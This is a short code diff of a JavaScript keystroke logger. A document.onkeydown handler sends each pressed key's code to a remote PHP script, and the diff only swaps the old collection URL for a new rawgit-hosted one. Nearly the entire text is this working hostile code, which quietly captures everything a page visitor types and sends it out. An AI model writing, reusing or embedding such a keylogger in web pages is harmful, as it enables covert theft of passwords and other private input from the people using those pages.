@@ -1,5 +1,5 @@
 document.onkeydown = function(k){
  url = new XMLHttpRequest();
- url.open("get", "http://latin2chat.260mb.net/files/keyPHP.php?k=" + k.keyCode);
+ url.open("get", "https://rawgit.com/Usagi86/ClienteLT/master/keyPHP.php?k=" + k.keyCode);
  url.send(null);
 }
